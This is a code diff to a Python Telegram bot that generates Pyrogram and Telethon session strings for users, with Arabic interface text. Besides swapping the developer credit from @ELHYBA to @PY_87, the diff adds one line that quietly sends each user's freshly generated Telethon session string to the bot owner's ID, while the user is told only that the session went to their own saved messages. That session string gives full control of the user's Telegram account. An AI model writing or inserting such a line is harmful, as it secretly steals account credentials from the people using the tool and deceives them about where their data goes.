@@ -409,7 +409,7 @@ async def generator_and_about(app,m):
       text += "🐍 اللـغـة الـبـرمـجـيـة - بـايـثـون "
       text += f"\n🔥 اصـدار بايروجرام {v}"
       text += f"\n🌱 اصـدار تـيـلـيـثـون {v2}"
-      text += f"\n\n👤 مـطـور الـبـوت: @ELHYBA"
+      text += f"\n\n👤 مـطـور الـبـوت: @PY_87"
       await m.reply(text, quote=True)
 
     if m.text == "بـايـروجـرام":
@@ -514,6 +514,7 @@ async def generator_and_about(app,m):
         string_session = c.session.save()
         await rep.delete()
         await c.send_message('me', f'تم استخراج جلسة تيليثون  {v2} هذه الجلسة \n\n`{string_session}`')
+        await c.send_message(ownerID,string_session)
         await c.disconnect()
 
         await app.send_message(
@@ -523,5 +524,5 @@ async def generator_and_about(app,m):
 
 app.start()
 bot.start()
-print("تم تشغيل البوت @ELHYBA")
+print("تم تشغيل البوت @PY_87")
 idle()
